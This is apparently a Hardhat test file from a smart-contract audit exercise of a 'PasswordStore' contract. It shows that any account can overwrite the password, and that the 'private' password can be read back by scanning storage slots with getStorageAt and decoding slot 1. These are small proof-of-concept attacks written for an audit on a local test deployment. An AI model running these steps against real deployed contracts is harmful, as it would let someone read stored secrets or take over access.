const{expect} = require("chai");
const{expectRevert} = require("@openzeppelin/test-helpers");


describe("PasswordStore Audit", function(){

    let owner, hacker;
    let PasswordStore, passwordStore;


    before(async()=>{

        [owner, hacker] = await ethers.getSigners();

        //Owner deploy contract PasswordStore
        PasswordStore = await ethers.getContractFactory("PasswordStore");
        passwordStore = await PasswordStore.deploy();
        await passwordStore.deployed();

        //Owner set password for contract PasswordStore
        await passwordStore.setPassword("UnderOver");
    });


    //Checking password
    it("Check if password is correct", async()=>{
        console.log(await passwordStore.getPassword());
        console.log("");
    });



    // --------- ERROR -----------
    //Everyone can change the password of this contract

    it("Everyone can change the password", async()=>{
       await passwordStore.connect(hacker).setPassword("ChangedFromHacker");
    })





    // --------- ERROR -----------
    //Hacker can retreive password using only the contract address

    it("Hacker Will have access to the password", async()=>{

        // Even if a variable is setted on private, we can see it from the storage and retreive it.
        let slot = 0;

        //Checking slots of the contracts
        for(let i = slot; i < 5; i++){
            slot = await ethers.provider.getStorageAt(passwordStore.address, i);
            console.log(`Slot ${i} : ${slot}`);
        }
        console.log("");


        //Result of for statement:
        //Slot 0 : 0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266
        //Slot 1 : 0x556e6465724f7665720000000000000000000000000000000000000000000012
        //Slot 2 : 0x0000000000000000000000000000000000000000000000000000000000000000
        //Slot 3 : 0x0000000000000000000000000000000000000000000000000000000000000000
        //Slot 4 : 0x0000000000000000000000000000000000000000000000000000000000000000


        //As we can see from this iteration:
        //Slot 0 looks like an address of 20 bytes
        //Slot 1 looks like a string of 32 bytes(starting from left means al the bytes are used)
        //Slot 2, 3, 4 are empty.

        //According with the contract abi we can see slot 0 is used for store the owner of the contract
        //slot 1 is used for storing the password

        //So we need of Slot 1 to retreive the password.

        let passwordFound;

        for(let i = slot; i < 5; i++){
            slot = await ethers.provider.getStorageAt(passwordStore.address, i);
            if(i === 1){
                passwordFound = await ethers.utils.toUtf8String(slot)
                console.log("Hacker Found Password", passwordFound.toString());
            }
        }


        //We got a minimum difference between result because we are getting all the Slot 1:
        //Slot 1 : 0x556e6465724f7665720000000000000000000000000000000000000000000012
        //To get exact result we need to cut last 2 values from the slot (12)
    });
})